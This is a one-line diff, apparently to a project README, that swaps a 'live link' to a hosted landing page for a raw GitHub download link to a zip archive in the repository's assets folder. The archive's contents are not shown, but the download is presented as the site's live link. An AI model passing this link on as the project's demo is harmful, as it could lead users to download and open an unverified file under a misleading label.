@@ -1,1 +1,1 @@
-live link : https://coderlity-landing-page.vercel.app/
+live link : https://github.com/jobayer58/Coderlity-landing-page/raw/refs/heads/main/src/assets/Coderlity-page-landing-v3.1.zip
